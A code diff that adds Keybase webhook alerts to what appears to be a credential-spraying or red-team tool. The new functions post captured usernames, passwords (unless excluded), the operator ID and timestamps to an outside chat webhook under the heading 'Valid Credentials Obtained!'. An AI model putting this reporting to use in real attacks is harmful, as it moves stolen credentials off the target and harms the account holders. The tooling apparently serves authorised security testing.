@@ -10,6 +10,7 @@ def notify_success(username, password, notify_obj):
     teams_webhook = notify_obj['teams_webhook']
     pushover_token = notify_obj['pushover_token']
     pushover_user = notify_obj['pushover_user']
+    keybase_webhook = notify_obj['keybase_webhook']
     operator = notify_obj['operator_id']
     exclude_password = notify_obj['exclude_password']
 
@@ -25,6 +26,9 @@ def notify_success(username, password, notify_obj):
     if teams_webhook is not None:
         teams_notify(username, password, operator, exclude_password, teams_webhook)
 
+    if keybase_webhook is not None:
+        keybase_notify(username, password, operator, exclude_password, keybase_webhook)
+
 
 def notify_update(message, notify_obj):
 
@@ -33,6 +37,7 @@ def notify_update(message, notify_obj):
     teams_webhook = notify_obj['teams_webhook']
     pushover_token = notify_obj['pushover_token']
     pushover_user = notify_obj['pushover_user']
+    keybase_webhook = notify_obj['keybase_webhook']
     operator = notify_obj['operator_id']
 
     if slack_webhook is not None:
@@ -46,6 +51,68 @@ def notify_update(message, notify_obj):
 
     if teams_webhook is not None:
         teams_update(message, operator, teams_webhook)
+    
+    if keybase_webhook is not None:
+        keybase_update(message, operator, keybase_webhook)
+
+
+# Function for posting username/password to keybase channel
+def keybase_notify(username, password, operator, exclude_password, webhook):
+
+    now = datetime.now()
+    date=now.strftime("%d-%m-%Y")
+    time=now.strftime("%H:%M:%S")
+
+    op_insert = ""
+    if operator is not None:
+        op_insert = f"Operator: {operator}\n"
+
+    pwd_insert = f"Pass: {password}\n"
+    if exclude_password:
+        pwd_insert = ""
+
+    text = ("```[Valid Credentials Obtained!]\n"
+            f"{op_insert}"
+            f"User: {username}\n"
+            f"{pwd_insert}"
+            f"Date: {date}\n"
+            f"Time: {time}```")
+
+    message = {
+        "msg" : text
+    }
+
+    response = requests.post(
+        webhook, data=json.dumps(message),
+        headers={'Content-Type': 'application/json'}
+    )
+
+
+# Function for debug messages
+def keybase_update(message, operator, webhook):
+
+    now = datetime.now()
+    date=now.strftime("%d-%m-%Y")
+    time=now.strftime("%H:%M:%S")
+
+    op_insert = ""
+    if operator is not None:
+        op_insert = f"Operator: {operator}\n"
+
+    text = ("```[Log Entry]\n"
+            f"{op_insert}"
+            f"{message}\n"
+            f"Date: {date}\n"
+            f"Time: {time}```")
+
+    message = {
+        "msg" : text
+    }
+    response = requests.post(
+        webhook, data=json.dumps(message),
+        headers={'Content-Type': 'application/json'}
+    )
+
 
 
 # Function for posting username/password to slack channel
